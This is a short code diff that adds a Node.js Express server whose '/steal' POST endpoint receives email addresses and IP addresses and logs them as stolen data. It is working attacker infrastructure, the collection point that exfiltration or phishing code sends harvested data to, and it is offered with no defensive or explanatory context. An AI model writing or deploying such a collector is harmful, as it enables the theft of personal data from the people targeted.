@@ -1,0 +1,16 @@
+const express = require('express');
+const app = express();
+const bodyParser = require('body-parser');
+
+app.use(bodyParser.json());
+
+app.post('/steal', (req, res) => {
+    const email = req.body.email;
+    const ip = req.body.ip;
+    console.log(`Stolen email: ${email} from IP: ${ip}`);
+    res.send('OK');
+});
+
+app.listen(80, () => {
+    console.log('Server started');
+});
